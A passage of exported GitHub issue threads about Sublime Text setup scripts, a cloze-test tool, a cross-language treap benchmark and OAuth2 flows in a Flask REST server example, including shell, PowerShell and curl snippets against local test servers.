To batch install other packages, a _Package Control.sublime-settings_ file needs to be placed into the _Packages/User/_ folder. Inside of the settings file should be a JSON object with the key _"installed_packages"_ that references a list of package names. When Package Control starts, if any of those packages are not present, the will be automatically downloaded and installed. Here is an example: http://pastebin.com/NLEavL1K.
</Body>
    </Comment>
    <Comment>
      <Owner>paulirish</Owner>
      <Body>Magic. Exactly what I needed to hear. :)

Thanks Will! Your contributions are incredible.
</Body>
    </Comment>
    <Comment>
      <Owner>mrmartineau</Owner>
      <Body>@wbond, that is awesome! Perhaps I'll create that file here so people can bulk install all these packages. 

@paulirish Could the Package Control.sublime-package file &amp; other custom settings files be installed by running one install script? And @wbond Could Package Control &amp; this install script be installed with one command &amp; then you restart Sublime?
</Body>
    </Comment>
    <Comment>
      <Owner>wbond</Owner>
      <Body>It would be fairly trivial to write a bash script that utilizes wget/curl to perform the download and install on OS X and Linux. I'm sure there is some way to do the same on Windows with WSH, there is just the slight added complexity that the Windows versions of Sublime can be portable, so there isn't always a definitive place for the config folder.
</Body>
    </Comment>
    <Comment>
      <Owner>alister</Owner>
      <Body>I've got a Puppet manifest to install the dev (or beta) and then, after the program has been run for the first time (and the base packages have been installed/directories created), it will go on to install whatever other packages you specify.

```
https://github.com/alister/puppet-sublimetext2
```
</Body>
    </Comment>
    <Comment>
      <Owner>mmacedo</Owner>
      <Body>@paulirish @wbond, it would be nice to have a oneliner like @mrmartineau suggested, but to be executed not from the editor, from command line. As you can see in the snippet below, I use curl to download package_control on Linux and cp to paste my package list, but after that I have to open, wait and close Sublime Text 2 manually several times for it complete. I don't think I can open sublime text 2 just to execute a script and close with a command.

``` bash
ST2=~/.config/sublime-text-2
mkdir -p $ST2/{Installed\ Packages,Packages/User}
curl http://sublime.wbond.net/Package%20Control.sublime-package \
  &gt; $ST2/Installed\ Packages/Package\ Control.sublime-package
cp $DOTFILES/st2/* $ST2/Packages/User
# Open Sublime Text and wait a bunch of minutes for package_control to install
# itself and all packages (several errors and manual restarts are expected)
```
</Body>
    </Comment>
    <Comment>
      <Owner>vishaltelangre</Owner>
      <Body>@mmacedo I have wrote a little gist to make this process little easier:
https://gist.github.com/vishaltelangre/5075346
</Body>
    </Comment>
    <Comment>
      <Owner>mrmartineau</Owner>
      <Body>Thanks @mmacedo. I will link to your post in the wiki
</Body>
    </Comment>
    <Comment>
      <Owner>evanplaice</Owner>
      <Body>@mrmartineau @mmacedo @paulirish @wbond. Go figure...

I've been working on automating the sublime install+config. I started with a shell script then changed to python. A network admin buddy of mine is learning python so I decided to rewrite it as a python application and make it cross-platform so he can see the python-equivalent of a bash script.

_Note: I haven't implemented the Windows portion yet but it should work in both Linux and OSX._

Since there's interest here, I migrated the code into its own repository @ https://github.com/evanplaice/sublime-text-seed.

_The `setup.py` script handles the following:_
1. **_Check and install `Sublime Text`**_
   
   If `Sublime Text` isn't found, it automates the install via `apt-get` (*nix), `homebrew` (OSX), or `chocolatey` (Windows).
2. **_Install `Package Control`**_
   
   Since `Package Control` needs to be installed separately, it fetches it with `urllib2` via a `GET` request.
3. **_Copy the configuration**_
   
   The config files found in the config directory are copied to the default settings locations, which differ for each OS.
4. **_Copy the license (Not Implemented)**_
   
   If found , the license file is setup. 
   
   _Note: Which is included in `.gitignore` by default to prevent a credential leak._
</Body>
    </Comment>
    <Comment>
      <Owner>voltagex</Owner>
      <Body>And in Powershell 5:

``` powershell
$packageControl = "http://sublime.wbond.net/Package%20Control.sublime-package"
$sublimeConfig = "$env:APPDATA\Sublime Text 3"
$packagesRoot = "$sublimeConfig\Installed Packages"
$userPackages = "$sublimeConfig\Packages\User"

Invoke-WebRequest $packageControl -OutFile "$packagesRoot\Package Control.sublime-package"

$packagesToInstall = @{
    installed_packages = @(
    "SFTP",
    "Git"
    )
}

ConvertTo-Json $packagesToInstall | Out-File "$userPackages\Package Control.sublime-settings" -Encoding ASCII
```
</Body>
    </Comment>
    <Comment>
      <Owner>ahmadassaf</Owner>
      <Body>building on @evanplaice code .. i have also included automatic sublime projects creation in https://github.com/ahmadassaf/sublime-text-bootstrap</Body>
    </Comment>
    <Comment>
      <Owner>wbond</Owner>
      <Body>@ahmadassaf @evanplaice The code you have is extremely insecure in terms of installing Package Control:&#13;
&#13;
 1. Is uses HTTP, allowing MITM attacks&#13;
 2. It uses a domain name that Package Control stopped using years ago&#13;
&#13;
Modern versions of Sublime Text include a command to install Package Control securely. If you want to automate things, just call that command (look in the Default.sublime-commands for the command name).</Body>
    </Comment>
    <Comment>
      <Owner>ahmadassaf</Owner>
      <Body>Thanks a lot @wbond for this info. I have just updated the link to the one i noticed in the latest instructions `https://packagecontrol.io/Package%20Control.sublime-package`</Body>
    </Comment>
    <Comment>
      <Owner>evanplaice</Owner>
      <Body>@wbond Thanks for the heads-up. The package control setup has been updated to use the more secure source link. Using the command pallet would be great but this tool is intended to be used as a complete unattended setup. AFAIK, it's not possible to launch commands in sublime directly from the CLI.&#13;
&#13;
@ahmadassaf Nice work. When I get the chance I'll have to review the changes you made in detail, I could probably learn a few things from the improvements you made.</Body>
    </Comment>
  </Issue_841>
  <Issue_842>
    <Repository>SublimeTextSetupWiki</Repository>
    <Title>Added Reveal in Sidebar (Cmd-Shift-R) and Toggle Sidebar (Ctrl-S)</Title>
    <Owner>mrmartineau</Owner>
    <Body>Sublime was driving me crazy until I figured out how to add "Reveal in Sidebar". And Toggle sidebar is one key instead of Cmd-K-B
</Body>
    <State>open</State>
    <Comment>
      <Owner>firedev</Owner>
      <Body>I don't know how one can work without Reveal in Sidebar.
</Body>
    </Comment>
  </Issue_842>
  <Issue_843>
    <Repository>zander.wtf-2017</Repository>
    <Title>Please turn the blanks into underscores _ with automatic numbering</Title>
    <Owner>mrmartineau</Owner>
    <Body>Hello, I find your tool extremely useful as I myself is a university lecturer. However after pasting the texts in Words, the blanks are pasted with a box. Can it be just normal ....... or ______, or better, with numbering before it, like (1) __________, ...

Thank you very much!
</Body>
    <State>open</State>
    <Comment>
      <Owner>mrmartineau</Owner>
      <Body>This makes a lot of sense. I will try to do this in the next few weeks.
</Body>
    </Comment>
  </Issue_843>
  <Issue_844>
    <Repository>zander.wtf-2017</Repository>
    <Title>what?</Title>
    <Owner>mrmartineau</Owner>
    <Body>So how do I actually output the beautiful cloze, once created? Is it because I have a mac? I mean I've removed and randomised the words, then what? There's no other buttons.
</Body>
    <State>open</State>
    <Comment>
      <Owner>mrmartineau</Owner>
      <Body>Hi @jamanda, this page is a very simple version of a Cloze test so there is no other functionality beyind what you see there. I have, however, suggested in #2 that I create a better specific print view so that you can print these out to share around. What do you think?
</Body>
    </Comment>
  </Issue_844>
  <Issue_845>
    <Repository>zander.wtf-2017</Repository>
    <Title>Completing a Cloze activity as a student</Title>
    <Owner>mrmartineau</Owner>
    <Body>I like your interface for creating Cloze activities. Is this just a work in progress site? I can't seem to find any way to send a link to students to complete an activity?
</Body>
    <State>open</State>
    <Comment>
      <Owner>mrmartineau</Owner>
      <Body>Currently there is no way to send this to students without just copying an pasting the output. I could, create a simple print view that has the output and the keywords next to each other, would you like that?
</Body>
    </Comment>
    <Comment>
      <Owner>gbowman85</Owner>
      <Body>When I found your site I was looking for something to make cloze questions for moodle. There's more information here if you haven't seen it http://docs.moodle.org/22/en/Embedded_Answers_(Cloze)_question_type#Format

You've made a really slick interface, just does seem practical without a way to distribute. 

Maybe if there was a button to "Export for Moodle" which added the formatting that Moodle understands?
</Body>
    </Comment>
    <Comment>
      <Owner>mrmartineau</Owner>
      <Body>It doesn't look too hard to convert to this moodle format but I honestly don't know when I'd have the time to do it. I need to make some amends at some point soon so I will see if I can include this in with those. No promises though.. 
</Body>
    </Comment>
  </Issue_845>
  <Issue_846>
    <Repository>completely-unscientific-benchmarks</Repository>
    <Title>measuring Java startup costs</Title>
    <Owner>frol</Owner>
    <Body>The programs don't do much work so about 15% of the Java time is just startup costs that disappear (become amortised) if the program is run longer.&#13;
&#13;
So performing 10 times the work and dividing the time by 10 gives a magical performance boost:&#13;
&#13;
```&#13;
class Main {&#13;
    public static void program_main(String[] args) {&#13;
        Tree tree = new Tree();&#13;
        int cur = 5;&#13;
        int res = 0;&#13;
&#13;
        for (int i = 1; i &lt; 1000000; i++) {&#13;
            int a = i % 3;&#13;
            cur = (cur * 57 + 43) % 10007;&#13;
            if (a == 0) {&#13;
                tree.insert(cur);&#13;
            } else if (a == 1) {&#13;
                tree.erase(cur);&#13;
            } else if (a == 2) {&#13;
                boolean hasVal = tree.hasValue(cur);&#13;
                if (hasVal)&#13;
                    res++;&#13;
            }&#13;
        }&#13;
        System.out.println(res);&#13;
    }&#13;
&#13;
   public static void main(String[] args){&#13;
      for (int i=0; i&lt;10; ++i){ &#13;
         Main.program_main(args);     &#13;
      }&#13;
   }&#13;
}&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>frol</Owner>
      <Body>I encourage you to play with the solutions on your own computer and you can even fork or create your own benchmark from scratch!&#13;
&#13;
While I agree that it is unfair to compare runtime performance including the startup time, it is still a valid benchmark if you consider it to be a CLI application. I consider increasing the number of operations by 10, but even then it will include the startup time. I will consider measuring the time inside the solutions for the next benchmark iteration to avoid the startup times, but there is no ETA on that.</Body>
    </Comment>
    <Comment>
      <Owner>igouy</Owner>
      <Body>&gt; &#8230;or create your own benchmark from scratch!&#13;
&#13;
[Been there; done that.](https://benchmarksgame-team.pages.debian.net/benchmarksgame/)&#13;
&#13;
&gt; &#8230;even then it will include the startup time.&#13;
&#13;
Which might be very significant or very insignificant &#8212; and [as-long-as the difference is shown](https://benchmarksgame-team.pages.debian.net/benchmarksgame/sometimes-people-just-make-up-stuff.html#jvm-startup-time), you can allow others to decide if the difference seems significant to them.</Body>
    </Comment>
    <Comment>
      <Owner>igouy</Owner>
      <Body>_fwiw_  the same experiment with C# seems to show a smaller difference (dotnet --version 2.1.302)&#13;
&#13;
```&#13;
        static void Program_Main() {&#13;
            var tree = new Tree();&#13;
            var cur = 5;&#13;
            var res = 0;&#13;
&#13;
            for (var i = 1; i &lt; 1000000; i++) {&#13;
                var a = i % 3;&#13;
                cur = (cur * 57 + 43) % 10007;&#13;
                if (a == 0) {&#13;
                    tree.insert(cur);&#13;
                } else if (a == 1) {&#13;
                    tree.erase(cur);&#13;
                } else if (a == 2) {&#13;
                    if (tree.hasValue(cur))&#13;
                        res++;&#13;
                }&#13;
            }&#13;
            Console.WriteLine(res);&#13;
        }&#13;
&#13;
        static void Main() {&#13;
            for (var i = 1; i &lt; 100; i++) {&#13;
                Program_Main&#13;
            }&#13;
        }&#13;
    }&#13;
```&#13;
```&#13;
1&#13;
real 0m1.264s&#13;
user 0m1.231s&#13;
sys 0m0.032s&#13;
&#13;
100&#13;
real 1m55.594s&#13;
user 1m55.365s&#13;
sys 0m0.200s&#13;
```&#13;
</Body>
    </Comment>
  </Issue_846>
  <Issue_847>
    <Repository>completely-unscientific-benchmarks</Repository>
    <Title>Kotlin Native 0.8</Title>
    <Owner>frol</Owner>
    <Body>Hi,&#13;
&#13;
Can u update kotlin native benchmark with latest version please ?</Body>
    <State>open</State>
    <Comment>
      <Owner>frol</Owner>
      <Body>Please, run the benchmark on your computer with the Kotlin version I use and Kotlin 0.8, and report what kind of performance boost you see.</Body>
    </Comment>
    <Comment>
      <Owner>RUSshy</Owner>
      <Body>all benchmark should be done using same config to make comparison, my PC is different than yours, and i can't run all benchmark</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>My point is that I don't have a capacity to run every new release of every compiler in the benchmark to only confirm that it doesn't change anything. If you can compare the older Kotlin release performance with the new one and report that on your machine it speeds things up by 10%, I will rerun it on my machine and update the scoreboard. Otherwise, if the performance is the same, I can wait for the next release (ideally, 1.0).</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>Well, I found some time today and re-run Kotlin/Native solution using 0.8 release... Ouch, they have managed to slow it down that the solution execution time raised from 5.88s to 6.32s and the memory consumption has increased from 1.2MB to 7MB. I am not sure what I should do with these results now...</Body>
    </Comment>
    <Comment>
      <Owner>RUSshy</Owner>
      <Body>Thanks for taking time to do it&#13;
&#13;
I also tried on windows with mingw&#13;
&#13;
8.026s for 0.7&#13;
8.051s for 0.8.2&#13;
&#13;
I was hoping they fix performance, looks like they don't care..&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>RUSshy</Owner>
      <Body>9.518s with 0.9&#13;
&#13;
I don't know what they do, instead of fixing performance issue, they make it worse...</Body>
    </Comment>
    <Comment>
      <Owner>barsan-md</Owner>
      <Body>@RUSshy did you have the time to test the new Beta release 1.3.x?</Body>
    </Comment>
    <Comment>
      <Owner>barsan-md</Owner>
      <Body>My results are (on Linux):&#13;
&#13;
v0.9&#13;
real    0m5,452s&#13;
user    0m5,452s&#13;
sys     0m0,000s&#13;
&#13;
v1.3.10&#13;
real    0m5,549s&#13;
user    0m5,545s&#13;
sys     0m0,004s&#13;
&#13;
No performance improvements yet.</Body>
    </Comment>
    <Comment>
      <Owner>proyb6</Owner>
      <Body>My results:&#13;
Source compile from master repo (5 Jan 2019)&#13;
```&#13;
&gt; kotlinc-native -version&#13;
info: kotlinc-native 1.3.30-dev-532 (JRE 11.0.1+13)&#13;
Kotlin/Native: 1.2-dev&#13;
```&#13;
Build Kotlin/Native infrastructure took about an hour&#13;
macOS Mojave on Macbook Pro Early 2015 (2.7 GHz Intel Core i5)&#13;
&#13;
Have to update the code from:&#13;
```srand(time(null).toInt())```&#13;
to:&#13;
```srand(time(null).toUInt())```&#13;
to fix the error.&#13;
&#13;
With Optimization flag (Worse?) took 26 seconds to compile (1.2GB+ memory used):&#13;
real 0m8.931s&#13;
user 0m8.828s&#13;
sys 0m0.066s&#13;
CPU utilization: 99%&#13;
Used 21MB+ memory (Maximum resident set size (kbytes): 21808)&#13;
&#13;
Without Optimization flag took 18 seconds to compile (1.1GB+ memory used):&#13;
real 0m12.211s&#13;
user 0m12.116s&#13;
sys 0m0.047s&#13;
CPU utilization: 99%&#13;
Used 10MB+ memory (Maximum resident set size (kbytes): 10792)&#13;
&#13;
You read it right, optimization flag version consumes more memory.&#13;
&#13;
Kotlin, not Kotlin/Native:&#13;
Compiler for main-kt.kt used 266MB memory.&#13;
&#13;
main-kt.kt&#13;
real 0m0.978s&#13;
user 0m1.061s&#13;
sys 0m0.090s&#13;
CPU utilization: 120%&#13;
Used 141MB+ memory &#13;
&#13;
main-kt.kt (-Xms50M -Xmx50M)&#13;
real 0m0.931s&#13;
user 0m1.052s&#13;
sys 0m0.068s&#13;
CPU utilization: 120%&#13;
Used 18MB+ memory&#13;
&#13;
&#13;
Kotlin/Native memory usage went from 1.2MB (version 0.7) to 21MB (1.2-dev)?</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>@proyb6 hmm, but we don't compare compilation times here.</Body>
    </Comment>
    <Comment>
      <Owner>proyb6</Owner>
      <Body>Well, it&#8217;s not for the benchmark but for curious readers.</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>@proyb6&#13;
&#13;
&gt; You read it right, optimization flag version consumes more memory.&#13;
&#13;
There is nothing unusual that optimization process during compilation consumes more time and memory. This is the case for all compilers I know. The trade-off here is that the longer compilation time pays off with the faster run time of the resulting executable.</Body>
    </Comment>
    <Comment>
      <Owner>proyb6</Owner>
      <Body>I see I was referring to the memory usage when the program is run which use 21MB (optimization build), not the compilation part. Thank for your time to reply.</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>Ah, I see now! I think, I was misguided by "(Worse?)" comment.&#13;
&#13;
Yeah, the overall trend to significant performance degradation is definitely not what I had expected with newer compiler releases.</Body>
    </Comment>
  </Issue_847>
  <Issue_848>
    <Repository>completely-unscientific-benchmarks</Repository>
    <Title>Replace Go implementation by a more naive one</Title>
    <Owner>frol</Owner>
    <Body>I came across these benchmarks, and found the current Go implementation relatively hard to read.&#13;
This (completely new) implementation aims to be better to read and maintain, with the following major differences:&#13;
&#13;
- Rename Node's X,Y to Value and Weight&#13;
- Make methods of functions that operate on *Node&#13;
- Concentrate complexity in the *Node methods&#13;
&#13;
The implementation seems to be a bit faster as well.&#13;
&#13;
PS: I've opted to replace the current `main.go` because this is also a 'naive' implementation using raw pointers. This makes the diff is a bit useless, sorry about that.</Body>
    <State>open</State>
    <Comment>
      <Owner>frol</Owner>
      <Body>&gt; The implementation seems to be a bit faster as well.&#13;
&#13;
It is faster because you changed the algorithm of the `Contains` implementation. I will only be able to merge your solution once it implements the same algorithm as all the other languages (using split + merge).</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>I like your API design. I think most of the naive implementations (in other languages) would also benefit in readability if apply this design. Currently, most of the naive implementations (inlcuding Go) have the same API design, and I am not sure how to proceed with this PR. I consider having a second edition of the benchmark in the future (e.g. in a year, when the compilers will evolve even futher), so I think, I will need to organize the repository the way to indicate that the results are "fixed" while the solutions can be improved.&#13;
&#13;
Thank you for your interest!</Body>
    </Comment>
    <Comment>
      <Owner>silkeh</Owner>
      <Body>&gt; It is faster because you changed the algorithm of the Contains implementation. I will only be able to merge your solution once it implements the same algorithm as all the other languages (using split + merge).&#13;
&#13;
Right, I completely missed that. Updated.&#13;
&#13;
&gt; I like your API design. I think most of the naive implementations (in other languages) would also benefit in readability if apply this design. Currently, most of the naive implementations (inlcuding Go) have the same API design, and I am not sure how to proceed with this PR. I consider having a second edition of the benchmark in the future (e.g. in a year, when the compilers will evolve even futher), so I think, I will need to organize the repository the way to indicate that the results are "fixed" while the solutions can be improved.&#13;
&#13;
The API design here is mostly for aiding readability, but it shouldn't influence the actual performance. I guess the solution would be to not restrict solutions to an API with the actual object and method names, but to allow readable solutions with implementations in the spirit of the benchmark (Treap with split and merge). This may also allow languages to (better) show what they have to offer in terms of readability.</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>&gt; I guess the solution would be to not restrict solutions to an API with the actual object and method names.&#13;
&#13;
Well, this is a double-edged sword. Having all solutions sharing the API makes it easier to compare the syntax of different languages.&#13;
&#13;
Having `Contains` / `Insert` / `Delete` on a `Node` might also be questionable. In the scope of the current benchmark, it looks good, but I have just realized that `some_node.Delete(other_node)` looks odd.</Body>
    </Comment>
    <Comment>
      <Owner>silkeh</Owner>
      <Body>&gt; Well, this is a double-edged sword. Having all solutions sharing the API makes it easier to compare the syntax of different languages.&#13;
&#13;
Good point. I have updated the names to match the API for this PR, Go isn't a language with standardised naming for these things anyway. ([Gist of original implementation here](https://gist.github.com/silkeh/bab26fd8f479f1843320c002c5d02e2b))&#13;
&#13;
I think this discussion should probably take place in an issue when it's time for the second edition of benchmarks.&#13;
&#13;
&gt; Having Contains / Insert / Delete on a Node might also be questionable. In the scope of the current benchmark, it looks good, but I have just realized that some_node.Delete(other_node) looks odd.&#13;
&#13;
I guess in more general applications a node would be an unexported implementation detail and only `Tree` should be used for interaction.</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>@silkeh Thank you for your contribution! I have no estimated time when I will get back to this benchmark, but once that happens, I will surely take this PR into account.</Body>
    </Comment>
  </Issue_848>
  <Issue_849>
    <Repository>completely-unscientific-benchmarks</Repository>
    <Title>Inconsistent number of loop iterations across languages: review all of them</Title>
    <Owner>frol</Owner>
    <Body>I noticed that there's a variety of differences in loop iterations across languages. Kotlin has `1..1000000` which means going 1_000_000 times, from 1 through 1_000_000 inclusive. Some of the other implementations seem to be off from that by 1 in some direction or other, e.g., the Java version actually executes from 1 to 999_999. Obviously missing one iteration doesn't make any difference to any benchmarks, but still, it seems the code for each language should be equivalent unless otherwise noted (especially memory management styles).</Body>
    <State>open</State>
    <Comment>
      <Owner>PMunch</Owner>
      <Body>I checked this in Nim, it was originally doing `0 .. 1_000_000` which is inclusive. Changed it to `0 ..&lt; 1_000_000` so it should be fine.</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>We should change all of the solutions to go from 0 to 999999 inclusively, I think.</Body>
    </Comment>
    <Comment>
      <Owner>johnperry-math</Owner>
      <Body>I had based the Ada and Modula-2 versions off the C++ version, which has&#13;
&#13;
    for(int i = 1; i &lt; 1000000; i++)&#13;
&#13;
That goes from 1 to 999999, inclusive, which is how I set up their `for` loops. It would be easy to modify; I just wanted to make sure this was the case.&#13;
&#13;
As an aside, if someone supplies an implementation and doesn't pay attention to that sort of thing, then there is no doubt that this is a "Completely Unscientific Benchmark." ;-)&#13;
&#13;
More seriously, it becomes a little worrisome what else might be going on. I noticed that some implementations, perhaps in an attempt to make the time look better, allocate a memory pool and grab &amp; return memory to that, perhaps (probably?) to avoid the hit from a garbage collector or the run-time or the system. I think that defeats the purpose of this benchmark, however unscientific it may be. Perhaps some ground rules should be laid down on what tricks are allowed.</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>&gt;  I think that defeats the purpose of this benchmark, however unscientific it may be. Perhaps some ground rules should be laid down on what tricks are allowed.&#13;
&#13;
You are right. I will try to come up with the rules.</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>&gt; I noticed that some implementations, perhaps in an attempt to make the time look better, allocate a memory pool and grab &amp; return memory to that&#13;
&#13;
By the way, which solutions do you refer to? I have marked Object Pascal "no-heap" solution as cheating, but I don't see if there are any more such solutions.</Body>
    </Comment>
    <Comment>
      <Owner>johnperry-math</Owner>
      <Body>When I wrote "some", it was off the top of my head, so perhaps there was just that one.</Body>
    </Comment>
  </Issue_849>
  <Issue_850>
    <Repository>flask-restplus-server-example</Repository>
    <Title>auth failed with access_token from Client Credentials Grant</Title>
    <Owner>frol</Owner>
    <Body>```&#13;
$ curl 'http://127.0.0.1:5000/auth/oauth2/token?grant_type=client_credentials' --user 'documentation:KQ()SWK)SQK)QWSKQW(SKQ)S(QWSQW(SJ*HQ&amp;HQW*SQ*^SSQWSGQSG'&#13;
{"access_token": "lYoijoYaTgXZi1bLQTs4PuItKsNHNY", "token_type": "Bearer", "expires_in": 3600, "scope": "users:write teams:write auth:write users:read auth:read teams:read"}&#13;
```&#13;
&#13;
Grab the above access_token and access protected resources.&#13;
&#13;
```&#13;
$ curl --header 'Authorization: Bearer lYoijoYaTgXZi1bLQTs4PuItKsNHNY' 'http://127.0.0.1:5000/api/v1/users/me'&#13;
{&#13;
    "status": 401, &#13;
    "message": "The server could not verify that you are authorized to access the URL requested. You either supplied the wrong credentials (e.g. a bad password), or your browser doesn't understand how to supply the credentials required."&#13;
}&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>frol</Owner>
      <Body>I confirm the issue. I will dive into it later this week.</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>Ah, I see now. The documentation misguided the use of Client Credentials Grant. The `documentation` "user" is not an active user, it serves the "application" user role (e.g. a third-party Twitter service needs its own application key/secret [in my example, you can create an inactive user with username/password and issue client id/secret for the service] to authenticate real users). Thus, you need to issue OAuth2 client id/secret for an active user; you can do this either via direct access to the database or via REST endpoints:&#13;
&#13;
Authenticate as a target user using Resource Owner Password Credentials Grant (or in any other way):&#13;
&#13;
```&#13;
$ curl -X POST --user 'documentation:' -F 'username=root' -F 'password=q' 'http://127.0.0.1:5000/auth/oauth2/token?grant_type=password'&#13;
{"access_token": "zrib5LuDmOQ0DmFd73SN37tll6eJvG", "expires_in": 3600, "token_type": "Bearer", "scope": "users:write teams:write auth:write users:read auth:read teams:read", "refresh_token": "gG2yfwaou6c1eUqaZRSSZjQPVboyTn"}&#13;
```&#13;
&#13;
(optional) Test the `access_token`:&#13;
&#13;
```&#13;
$ curl --header 'Authorization: Bearer zrib5LuDmOQ0DmFd73SN37tll6eJvG' 'http://127.0.0.1:5000/api/v1/users/me'&#13;
{&#13;
    "is_active": true,&#13;
    "last_name": "",&#13;
    "email": "root@localhost",&#13;
    "username": "root",&#13;
    "updated": "2017-03-07T15:05:49.574463+00:00",&#13;
    "middle_name": "",&#13;
    "is_admin": true,&#13;
    "is_regular_user": true,&#13;
    "created": "2017-03-07T15:05:49.574439+00:00",&#13;
    "first_name": "",&#13;
    "id": 1&#13;
}&#13;
```&#13;
&#13;
Issue OAuth2 client id and secret:&#13;
&#13;
```&#13;
$ curl -X POST --header 'Authorization: Bearer zrib5LuDmOQ0DmFd73SN37tll6eJvG' -F 'default_scopes=users:read' 'http://127.0.0.1:5000/api/v1/auth/oauth2_clients/'&#13;
{&#13;
    "user_id": 1,&#13;
    "client_type": "public",&#13;
    "client_id": "p2LqTKz6BdB7u4luBssLL5smc8jvtGGB6Fcm5Sli",&#13;
    "default_scopes": [&#13;
        "users:read"&#13;
    ],&#13;
    "redirect_uris": [],&#13;
    "client_secret": "eWslBvJVQMqTLRxlOCDyM7Umv4bp2OqL7kZZILF4QJAEmJiSle"&#13;
}&#13;
```&#13;
&#13;
Issue the `access_token` using Client Credentials Grant:&#13;
&#13;
```&#13;
$ curl 'http://127.0.0.1:5000/auth/oauth2/token?grant_type=client_credentials' --user 'p2LqTKz6BdB7u4luBssLL5smc8jvtGGB6Fcm5Sli:eWslBvJVQMqTLRxlOCDyM7Umv4bp2OqL7kZZILF4QJAEmJiSle'&#13;
{"access_token": "76Z4u3EWQIRpoU5vCkOs8Bw2mfJ4Be", "expires_in": 3600, "token_type": "Bearer", "scope": "users:read"}&#13;
```&#13;
&#13;
Test the `access_token` issued with Client Credentials Grant:&#13;
&#13;
```&#13;
$ curl --header 'Authorization: Bearer 76Z4u3EWQIRpoU5vCkOs8Bw2mfJ4Be' 'http://127.0.0.1:5000/api/v1/users/me'&#13;
{&#13;
    "is_active": true,&#13;
    "last_name": "",&#13;
    "email": "root@localhost",&#13;
    "username": "root",&#13;
    "updated": "2017-03-07T15:05:49.574463+00:00",&#13;
    "middle_name": "",&#13;
    "is_admin": true,&#13;
    "is_regular_user": true,&#13;
    "created": "2017-03-07T15:05:49.574439+00:00",&#13;
    "first_name": "",&#13;
    "id": 1&#13;
}&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>I will need to clarify the documentation and consider a better error message.</Body>
    </Comment>
  </Issue_850>
  <Issue_851>
    <Repository>flask-restplus-server-example</Repository>
    <Title>Auto-generated schema does not respect load_only flag&#8230;</Title>
    <Owner>frol</Owner>
    <Body>I noticed that, when generating the doc, the `load_only` flag is not respected, and fields marked as such will appear in the description of the output schema.&#13;
&#13;
Serialisation itself seems to be done correctly and the field does not seem to be returned by the query.&#13;
&#13;
From what I can see, this is due to the (expected) behaviour of `fields2jsonschema`, which does not exclude `load_only` fields:&#13;
https://github.com/marshmallow-code/apispec/issues/119&#13;
&#13;
I am not too sure why serialisation works (wouldn't it get the same schema?)&#8230; But in any case, do you have any opinion on what would be the best way to fix this? &#13;
&#13;
I guess one option is to create a `DumpOnlySchema` mixin similar to what is being done by `PostFormParameters` for `dump_only` fields? Any better way?</Body>
    <State>open</State>
    <Comment>
      <Owner>frol</Owner>
      <Body>I will try to dig into the problem later today. Thank you for reporting this!</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>Yeah, that is a bummer. I think this should be fixed in apispec.</Body>
    </Comment>
  </Issue_851>
  <Issue_852>
    <Repository>flask-restplus-server-example</Repository>
    <Title>Tests failing with pg but ok with sqlite</Title>
    <Owner>frol</Owner>
    <Body>Hi, I'm ok with tests since maybe 8 months and I just merged your upstream repo with mine, now I have tests failing with postgres only (which I use in my CI) but with sqlite, no errors. Any ideas ?&#13;
&#13;
https://gist.github.com/askz/33f2d0d8bb6f1d953c7c1ef6f16b4fef</Body>
    <State>open</State>
    <Comment>
      <Owner>frol</Owner>
      <Body>I have no idea what caused the change of client_id from `regular_user_client` to `OAUTH2_regular_user` in the first two failing tests. &#13;
&#13;
As to the last two, I expected that, PostgreSQL uses auto incrementing which never gets reset (even if you delete all the records from a table), which is why /1 and /2 IDs return 404, since there were other tests before this one, which took those IDs earlier and already dropped the records. We should implement a more robust tests instead implicitly hoping that those IDs will match in runtime.</Body>
    </Comment>
    <Comment>
      <Owner>askz</Owner>
      <Body>Okay, I'll try to fix that by referecing instances directly.</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>@askz Have you had a chance to fix that?</Body>
    </Comment>
    <Comment>
      <Owner>askz</Owner>
      <Body>Not at all, sorry... In fact I leaved the project where I was using your base.&#13;
</Body>
    </Comment>
  </Issue_852>
  <Issue_853>
    <Repository>flask-restplus-server-example</Repository>
    <Title>Implements tests for tasks</Title>
    <Owner>frol</Owner>
    <Body>Hi,&#13;
&#13;
This is obviously related to #70; &#13;
&#13;
I have no idea how to implement these tests (and haven't searched yet) but would really want to help!</Body>
    <State>open</State>
    <Comment>
      <Owner>frol</Owner>
      <Body>Yeah... I have no idea how to implement this either :(&#13;
&#13;
I will think of a way to implement this over weekend.</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>Well, it seems that commands testing can be a part of integrational testing, which is not implemented yet.</Body>
    </Comment>
  </Issue_853>
  <Issue_854>
    <Repository>flask-restplus-server-example</Repository>
    <Title>Nested path for PATCH operations ?</Title>
    <Owner>frol</Owner>
    <Body>imagine I have a profile linked to my user and I want to expose only one route (/users/) to patch the twos, is it actually possible ?&#13;
Seems like the actual implementation isn't compatible ? is it ?&#13;
&#13;
&#13;
I created two tuples and merged them with :     &#13;
PATH_CHOICES = USER_CHOICES (as /%s) + PROFILE_CHOICES (as /profile/%s)&#13;
                                                           &#13;
But I get this error : &#13;
```&#13;
marshmallow.exceptions.ValidationError: Field 'parts_number' does not exist, so it cannot be patched&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>askz</Owner>
      <Body>So, I came up with : &#13;
```python&#13;
    @classmethod&#13;
    def replace(cls, obj, field, value, state):&#13;
        if 'profile/' in field:&#13;
